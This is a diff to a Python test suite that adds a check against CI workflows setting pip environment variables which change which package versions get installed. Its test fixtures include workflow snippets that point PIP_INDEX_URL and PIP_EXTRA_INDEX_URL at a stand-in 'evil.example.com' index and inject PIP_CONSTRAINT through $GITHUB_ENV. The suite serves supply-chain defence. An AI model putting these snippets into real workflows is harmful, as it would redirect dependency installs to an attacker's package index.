@@ -18,6 +18,10 @@ The rule they enforce is deliberately shaped so it needs no list of its own:
   * it may pass only options that cannot change which version pip resolves,
     and the table of those is a whitelist, so an option this file has never
     heard of fails rather than being skipped;
+  * and no `PIP_*` variable may be set around it except the environment twin
+    of an option already on that whitelist — pip reads `PIP_<OPTION>` for
+    every option it has, so `PIP_CONSTRAINT` is `-c` and `PIP_INDEX_URL` is
+    `-i`, and the whitelist would have read the command line and missed them;
   * so a package added to requirements-dev.txt is covered the moment it is
     added, and nothing here has to be widened to notice it.
 
@@ -214,6 +218,37 @@ VERSION_NEUTRAL_VALUE_OPTIONS = frozenset({
 # `-r` is the point of the whole file, so it is read rather than skipped: the
 # file it names is checked against the declared one.
 REQUIREMENT_OPTIONS = frozenset({"-r", "--requirement"})
+
+# EVERY PIP OPTION HAS AN ENVIRONMENT TWIN, and the whitelist above only reads
+# the command line. pip takes `PIP_<OPTION>` for any option it accepts, so
+# `PIP_CONSTRAINT` is `-c`, `PIP_INDEX_URL` is `-i`, `PIP_EXTRA_INDEX_URL`,
+# `PIP_FIND_LINKS` and `PIP_PRE` are the rest of the families the whitelist
+# rejects — set one and the install reads requirements-dev.txt and resolves
+# somewhere else. Measured with the pip on this machine:
+# `PIP_CONSTRAINT=/nonexistent/nope.txt python3 -m pip install -r /dev/null`
+# fails on the constraints path it was never passed.
+#
+# The allowed set is DERIVED from the option whitelist rather than written
+# again, so the two cannot drift: an option that cannot change a version has
+# an environment twin that cannot either, and one that is not on the whitelist
+# has no twin here. A short option has no environment form of its own — pip
+# names the variable after the long option — so only those are converted.
+def pip_environment_name(option: str) -> str:
+    """pip's environment variable for a long option: `--no-cache-dir` ->
+    `PIP_NO_CACHE_DIR`."""
+    return "PIP_" + option.lstrip("-").replace("-", "_").upper()
+
+
+VERSION_NEUTRAL_PIP_ENV = frozenset(
+    pip_environment_name(option)
+    for option in VERSION_NEUTRAL_FLAGS | VERSION_NEUTRAL_VALUE_OPTIONS
+    if option.startswith("--")
+)
+
+# `PIP_<NAME>=` at the start of a token. Catches the three shapes a shell has
+# for setting one: the `NAME=value` prefix of a command, `export NAME=value`,
+# and `echo "NAME=value" >> $GITHUB_ENV`, which sets it for every later step.
+PIP_ENVIRONMENT_ASSIGNMENT = re.compile(r"(PIP_[A-Z0-9_]*)=")
 
 
 def canonical(name: str) -> str:
@@ -776,6 +811,81 @@ def test_a_workflow_install_names_no_package_of_its_own(where, command, args, wo
     )
 
 
+def env_mappings(node, path=""):
+    """(key path, variable name) for every key of every `env:` mapping.
+
+    Walks the whole document rather than the three levels Actions defines one
+    at today, so a workflow `env:`, a job's, a step's and anything a future
+    Actions feature adds all arrive here. The stray-scalar walk cannot see
+    these: it reads scalar VALUES, and `PIP_CONSTRAINT: drift.txt` hides in
+    the KEY.
+    """
+    if isinstance(node, dict):
+        for key, value in node.items():
+            if key == "env" and isinstance(value, dict):
+                for name in value:
+                    yield f"{path}.env.{name}", str(name)
+            yield from env_mappings(value, f"{path}.{key}")
+    elif isinstance(node, list):
+        for index, value in enumerate(node):
+            yield from env_mappings(value, f"{path}[{index}]")
+
+
+def pip_environment(root=REPO_ROOT):
+    """(where, variable name) for every PIP_* variable governed YAML sets."""
+    found = []
+    for path in governed_files(root):
+        rel = path.relative_to(root).as_posix()
+        doc = yaml.safe_load(path.read_text(encoding="utf-8"))
+        if isinstance(doc, dict):
+            found.extend((f"{rel}{key}", name)
+                         for key, name in env_mappings(doc)
+                         if name.startswith("PIP_"))
+    for path, label, index, _name, body, shell, _workdir in parsed_run_steps(root):
+        if "PIP_" not in body or not runs_a_command_line(shell):
+            continue
+        try:
+            tokens = shell_tokens(split_heredocs(body)[0])
+        except ValueError:
+            continue  # reported by the step walk as unplaceable already
+        where = f"{path.relative_to(root).as_posix()} {label} step {index}"
+        for token in tokens:
+            match = PIP_ENVIRONMENT_ASSIGNMENT.match(token)
+            if match:
+                found.append((where, match.group(1)))
+    return found
+
+
+PIP_ENVIRONMENT = pip_environment()
+
+
+def test_no_governed_yaml_sets_a_pip_variable_that_can_change_a_version():
+    """The option whitelist reads the command line, and pip does not stop
+    there: it takes `PIP_<OPTION>` for every option it accepts. `PIP_CONSTRAINT`
+    is `-c` by another name, and a constraints file beats requirements-dev.txt,
+    so an install this file calls clean installs a version the file does not
+    name. Both routes reach here — the `env:` key, which the stray-scalar walk
+    cannot see because the variable is the KEY rather than the value, and a
+    `NAME=value` in the shell, which the tokeniser was written to treat as
+    harmless."""
+    rejected = sorted(
+        f"{where} sets `{name}`"
+        for where, name in PIP_ENVIRONMENT
+        if name not in VERSION_NEUTRAL_PIP_ENV
+    )
+    assert not rejected, (
+        "\n".join(rejected)
+        + "\n\npip reads `PIP_<OPTION>` for every option it has, so these are "
+          "the options the whitelist rejects wearing another name: "
+          "PIP_CONSTRAINT is `-c`, PIP_INDEX_URL is `-i`, and either one "
+          "installs a version requirements-dev.txt does not name while the "
+          "command line still reads `-r requirements-dev.txt`. Only the "
+          "environment twins of options on VERSION_NEUTRAL_FLAGS and "
+          "VERSION_NEUTRAL_VALUE_OPTIONS are allowed, and that set is derived "
+          "from those tables rather than written out again."
+    )
+
+
 def scalars(node, path=""):
     """Every string scalar in a parsed document, with its key path.
 
@@ -1228,6 +1338,148 @@ def test_a_body_that_changes_directory_and_installs_nothing_stays_quiet():
     """`cd` is ordinary in these workflows. It is only a finding next to an
     install, or the rule would red every step that moves around a checkout."""
     assert scan_shell_body("cd tools && npm install left-pad") == ([], [])
+
+
+PIP_ENVIRONMENT_ROUTES = [
+    ("""\
+name: CI
+on: push
+jobs:
+  pytest:
+    runs-on: ubuntu-latest
+    steps:
+      - run: python3 -m pip install -r requirements-dev.txt
+        env:
+          PIP_CONSTRAINT: drift.txt
+""", "PIP_CONSTRAINT", "a step `env:`"),
+    ("""\
+name: CI
+on: push
+env:
+  PIP_INDEX_URL: https://evil.example.com/simple
+jobs:
+  pytest:
+    runs-on: ubuntu-latest
+    steps:
+      - run: python3 -m pip install -r requirements-dev.txt
+""", "PIP_INDEX_URL", "a workflow `env:`"),
+    ("""\
+name: CI
+on: push
+jobs:
+  pytest:
+    runs-on: ubuntu-latest
+    env:
+      PIP_EXTRA_INDEX_URL: https://evil.example.com/simple
+    steps:
+      - run: python3 -m pip install -r requirements-dev.txt
+""", "PIP_EXTRA_INDEX_URL", "a job `env:`"),
+    ("""\
+name: CI
+on: push
+jobs:
+  pytest:
+    runs-on: ubuntu-latest
+    steps:
+      - run: PIP_CONSTRAINT=drift.txt python3 -m pip install -r requirements-dev.txt
+""", "PIP_CONSTRAINT", "an inline assignment"),
+    ("""\
+name: CI
+on: push
+jobs:
+  pytest:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          export PIP_PRE=1
+          python3 -m pip install -r requirements-dev.txt
+""", "PIP_PRE", "an export"),
+    ("""\
+name: CI
+on: push
+jobs:
+  pytest:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "PIP_CONSTRAINT=drift.txt" >> "$GITHUB_ENV"
+""", "PIP_CONSTRAINT", "a write to $GITHUB_ENV"),
+]
+
+
+@pytest.mark.parametrize(
+    "text, variable, route", PIP_ENVIRONMENT_ROUTES,
+    ids=[route for _, _, route in PIP_ENVIRONMENT_ROUTES])
+def test_a_pip_variable_that_can_change_a_version_is_found(
+        tmp_path, text, variable, route):
+    """Every one of these installs a version requirements-dev.txt does not
+    name while the command line still reads `-r requirements-dev.txt`. The
+    `env:` routes are invisible to the tokeniser and to the stray-scalar walk
+    — that walk reads scalar VALUES, and `drift.txt` says nothing — and the
+    inline one is invisible because `NAME=value` is deliberately skipped as
+    "an environment assignment, not the program being run"."""
+    write_workflow(tmp_path, text)
+    assert [name for _, name in pip_environment(tmp_path)] == [variable]
+    assert variable not in VERSION_NEUTRAL_PIP_ENV
+
+
+NEUTRAL_PIP_ENVIRONMENT = """\
+name: CI
+on: push
+jobs:
+  pytest:
+    runs-on: ubuntu-latest
+    steps:
+      - run: PIP_NO_CACHE_DIR=1 python3 -m pip install -r requirements-dev.txt
+        env:
+          PIP_PROGRESS_BAR: 'off'
+          PIP_DISABLE_PIP_VERSION_CHECK: '1'
+"""
+
+
+def test_a_pip_variable_that_cannot_change_a_version_is_allowed(tmp_path):
+    """The allowed set is derived from the option whitelist, so the twins of
+    options already admitted on the command line are admitted here. A rule
+    that rejected every PIP_* variable would reject the ones these workflows
+    could reasonably use, and a check nothing can satisfy gets deleted."""
+    write_workflow(tmp_path, NEUTRAL_PIP_ENVIRONMENT)
+    names = {name for _, name in pip_environment(tmp_path)}
+    assert names == {"PIP_NO_CACHE_DIR", "PIP_PROGRESS_BAR",
+                     "PIP_DISABLE_PIP_VERSION_CHECK"}
+    assert names <= VERSION_NEUTRAL_PIP_ENV
+
+
+def test_the_allowed_pip_variables_are_the_whitelisted_options_renamed():
+    """The two tables cannot drift, because there is only one table: an
+    option's environment twin is derived from its name. `--constraint` is not
+    on the whitelist, so `PIP_CONSTRAINT` is not allowed either — and
+    `--requirement` is read rather than whitelisted, so `PIP_REQUIREMENT`, a
+    second requirements file by another name, is not allowed."""
+    assert pip_environment_name("--no-cache-dir") == "PIP_NO_CACHE_DIR"
+    assert "PIP_NO_CACHE_DIR" in VERSION_NEUTRAL_PIP_ENV
+    for option in ("--constraint", "--index-url", "--extra-index-url",
+                   "--find-links", "--pre", "--requirement",
+                   "--no-deps", "--trusted-host"):
+        assert option not in VERSION_NEUTRAL_FLAGS | VERSION_NEUTRAL_VALUE_OPTIONS
+        assert pip_environment_name(option) not in VERSION_NEUTRAL_PIP_ENV
+
+
+def test_a_shell_name_that_merely_starts_like_a_pip_variable_is_not_one(
+        tmp_path):
+    """account-skill-zips.yml sets `pip_ok=yes`. Environment variables are
+    case-sensitive and pip reads the uppercase form, so the lowercase flag is
+    not a pip setting and must not be reported as one."""
+    write_workflow(tmp_path, """\
+name: CI
+on: push
+jobs:
+  pytest:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          pip_ok=yes
+          python3 -m pip install -r requirements-dev.txt || pip_ok=no
+""")
+    assert pip_environment(tmp_path) == []
 
 
 MORE_WAYS_TO_HIDE_AN_INSTALL = [
